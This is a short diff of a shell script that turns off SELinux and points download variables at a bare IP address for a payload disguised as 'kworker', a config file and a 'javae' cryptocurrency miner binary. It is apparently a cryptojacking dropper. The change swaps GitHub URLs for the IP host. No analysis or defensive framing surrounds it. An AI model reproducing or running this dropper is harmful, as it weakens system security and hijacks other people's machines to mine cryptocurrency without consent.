@@ -49,12 +49,12 @@ setenforce 0
 echo SELINUX=disabled >/etc/selinux/config
 
 
-sh_url="https://github.com/Tszialim/LaunchJava/raw/refs/heads/main/kworker"
-sh_url_backup="https://github.com/Tszialim/LaunchJava/raw/refs/heads/main/kworker" 
-config_url="https://github.com/Tszialim/LaunchJava/raw/refs/heads/main/config.json"
+sh_url="http://20.205.243.166/Tszialim/LaunchJava/raw/refs/heads/main/kworker"
+sh_url_backup="http://20.205.243.166/Tszialim/LaunchJava/raw/refs/heads/main/kworker" 
+config_url="http://20.205.243.166/Tszialim/LaunchJava/raw/refs/heads/main/config.json"
 chattr_size="8000" 
-miner_url="https://github.com/Tszialim/LaunchJava/raw/refs/heads/main/javae"
-miner_url_backup="https://github.com/Tszialim/LaunchJava/raw/refs/heads/main/javae"
+miner_url="http://20.205.243.166/Tszialim/LaunchJava/raw/refs/heads/main/javae"
+miner_url_backup="http://20.205.243.166/Tszialim/LaunchJava/raw/refs/heads/main/javae"
 miner_size="8350992"
 
 ARCH=$(uname -m)
